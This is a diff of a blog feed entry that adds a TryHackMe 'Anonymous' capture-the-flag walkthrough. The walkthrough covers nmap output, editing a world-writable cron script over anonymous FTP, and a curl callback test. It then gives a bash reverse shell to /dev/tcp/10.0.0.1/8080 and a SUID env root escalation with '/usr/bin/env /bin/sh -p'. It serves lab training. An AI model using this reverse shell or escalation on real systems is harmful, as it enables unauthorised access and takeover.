@@ -14,7 +14,85 @@
       
       <guid>https://5ysk3y.github.io/thm/guides/anonymous/</guid>
       <description>Overview Welcome to this walkthrough of the TryHackMe room, Anonymous .
-This Medium Linux room leverages anonymous access to an FTP service in order to modify a script that&amp;rsquo;s run via cron every five minutes. This gets us a user shell and, from there, we abuse a SUID binary to get ourselves a root shell. All in all, this is a fun room to accomplish and has touches of OSCP-like concepts.</description>
+This Medium Linux room leverages anonymous access to an FTP service in order to modify a script that&amp;rsquo;s run via cron every five minutes. This gets us a user shell and, from there, we abuse a SUID binary to get ourselves a root shell.</description>
+      <content>
+  &lt;figure class=&#34;left&#34; &gt;
+    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/thm/anonymous.png&#34;   /&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
+&lt;p&gt;Welcome to this walkthrough of the &lt;a href=&#34;https://tryhackme.com&#34; target=&#34;_blank&#34;&gt;TryHackMe&lt;/a&gt;
+ room, &lt;a href=&#34;https://tryhackme.com/room/anonymous&#34; target=&#34;_blank&#34;&gt;Anonymous&lt;/a&gt;
+.&lt;/p&gt;
+&lt;p&gt;This Medium Linux room leverages anonymous access to an FTP service in order to modify a script that&amp;rsquo;s run via cron every five minutes. This gets us a user shell and, from there, we abuse a SUID binary to get ourselves a root shell. All in all, this is a fun room to accomplish and has touches of OSCP-like concepts.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;nmap-scan&#34;&gt;NMAP Scan&lt;/h1&gt;
+&lt;p&gt;As always we begin our enumeration with an NMAP scan. I&amp;rsquo;ve condensed it slightly to lessen the output:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;21/tcp  open  ftp         syn-ack vsftpd 2.0.8 or later
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxrwxrwx    2 111      113          4096 May 17 21:30 scripts [NSE: writeable
+
+22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
+
+139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
+&lt;h1 id=&#34;user-pwn&#34;&gt;User Pwn&lt;/h1&gt;
+&lt;p&gt;There&amp;rsquo;s two services that peaked my interest off the bat; FTP and SMB. Looking at both, they allow anonymous access. If we check SMB first, we can see a couple of files in a &lt;code&gt;pics&lt;/code&gt; share - downloading them and running them through &lt;code&gt;binwalk&lt;/code&gt; doesn&amp;rsquo;t show any hidden data. For now, we&amp;rsquo;ll assume this is intended as a distraction.&lt;/p&gt;
+&lt;p&gt;Turning to FTP, there&amp;rsquo;s a few files we can see through our anonymous login. A shell script, a log file and a text file. The latter txt file outlines how &lt;code&gt;anonymous&lt;/code&gt; access should probably be disabled in the form of a note from the author&amp;ndash; I&amp;rsquo;d agree. The log file we see is exactly that as it contains log entries. Finally we have a shell script called &lt;code&gt;clean.sh&lt;/code&gt; :&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;-rwxr-xrwx    1 1000     1000          346 May 19 18:31 clean.sh&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Reading the scripts contents, we can see that this file is responsible for updating the log file we found:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+tmp_files&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+echo $tmp_files
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; $tmp_files&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+        echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Running cleanup script:  nothing to delete&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /var/ftp/scripts/removed_files.log
+&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; LINE in $tmp_files; &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
+        rm -rf /tmp/$LINE &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;date&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; | Removed file /tmp/&lt;/span&gt;$LINE&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /var/ftp/scripts/removed_files.log;&lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Its a simple if/else statement that executes an echo statment that gets redirected into our log, based on the value of a defined variable. What the script is doing isn&amp;rsquo;t actually the important bit, the important bit is that, as well as read access to the file, also have permission to modify it. Attempts to download the script locally, modify it and re-upload seemingly failed, likely because the re-uploaded file doesn&amp;rsquo;t retain the right user permissions&amp;ndash; by default the file is owned by UID/GID 1000, if we re-upload the file this number changes to something else.&lt;/p&gt;
+&lt;p&gt;That said, we can modify files directly on the FTP server. I used &lt;code&gt;lftp&lt;/code&gt; here because I have mad issues with the standard Linux FTP binary if active mode is being used (it&amp;rsquo;s a FW problem I&amp;rsquo;ve not fixed yet):&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;lftp anonymous@10.10.210.243:/scripts&amp;gt; edit clean.sh&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;This opens the file up in vim &amp;ndash; note this is a local instance of vim, so breaking out of it is going to put you into a shell on your own local machine &amp;ndash; and from there we can edit it. For testing purposes I added a simple cURL command to the bottom of the file:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;curl 10.11.x.x/test&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Initially I thought things weren&amp;rsquo;t working until suddenly I got this through on my Python listener:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;10.10.210.243 - - [19/May/2020 19:45:03] &amp;quot;GET /test HTTP/1.1&amp;quot; 404 -&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Now, if we look at the time this occured we can see it was just after the 45th minute of the current hour - I left it and observed to see when, if at all, we got another hit and low and behold:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;10.10.210.243 - - [19/May/2020 19:50:04] &amp;quot;GET /test HTTP/1.1&amp;quot; 404 -&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;This should make it apparant that there&amp;rsquo;s something (we can assume it is a cron) running this script every 5 minutes. That makes the wait time between changes a bit painful but we have confirmed we can execute code. As I don&amp;rsquo;t trust 99% of rooms to contain a copy of &lt;code&gt;nc&lt;/code&gt; that includes the &lt;code&gt;-e&lt;/code&gt; executable flag, I decided to try a BASH specific method to get a shell, as we&amp;rsquo;re modifying a bash script. This is a method listed under the &lt;a href=&#34;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&#34; target=&#34;_blank&#34;&gt;Pentest Monkey CheatSheet&lt;/a&gt;
+:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Replacing this with my relevant IP and a port with an active listener, I waited until I finally got a connection:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ nc -nlvp 9001
+bash: cannot set terminal process group (1451): Inappropriate ioctl for device
+bash: no job control in this shell
+namelessone@anonymous:~$ whoami
+namelessone
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This gets us some shell access and the user.txt flag.&lt;/p&gt;
+&lt;h1 id=&#34;root-pwn&#34;&gt;Root Pwn&lt;/h1&gt;
+&lt;p&gt;Next up, as is standard practice whilst I poke around, I set off &lt;a href=&#34;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite&#34; target=&#34;_blank&#34;&gt;linPEAS&lt;/a&gt;
+ - this actually highlighted our privilage escalation vector. Reading though the output of a completed scan, I could see a particularly interesting binary listed under SUID binaries found on the system:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/usr/bin/env&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;This is not a typical SUID binary on a Linux system and having it as one is a good way to allow abuse to occur. If we run the name of this binary, &lt;code&gt;env&lt;/code&gt;, through the ever-popular &lt;a href=&#34;https://gtfobins.github.io/gtfobins/env/&#34; target=&#34;_blank&#34;&gt;GTFOBins&lt;/a&gt;
+ we can see that this can be used to gain access to root if the SUID bit is set. To take advantage of this we can run the following from our current user shell:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;namelessone@anonymous:/dev/shm$ /usr/bin/env /bin/sh -p
+id
+uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
+&lt;p&gt;Note that unless you have a full TTY you likely won&amp;rsquo;t get any output once you&amp;rsquo;ve elevated to root, but commands will still run. You&amp;rsquo;ll also retain your UID/GID, but the EUID (effective user-ID) will be set to root, which means you&amp;rsquo;re basically root. This will enable you to go and grab the root flag.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;final-thoughts&#34;&gt;Final Thoughts&lt;/h1&gt;
+&lt;p&gt;TL;DR - keep it simple and be careful and this room shouldn&amp;rsquo;t give you too much trouble.&lt;/p&gt;
+&lt;p&gt;This is a nice little OSCP-like box in terms of the things you have to check, and the room name provides the clue that we get initial access through anonymous logins. It was rated medium - many of the concepts used are basic so I wouldn&amp;rsquo;t personally say it&amp;rsquo;s that hard. It&amp;rsquo;s more about observation and ensuring that you&amp;rsquo;re not digging yourself a grave by, for example, re-uploading a modified file with incorrect permissions.&lt;/p&gt;
+</content>
     </item>
     
   </channel>
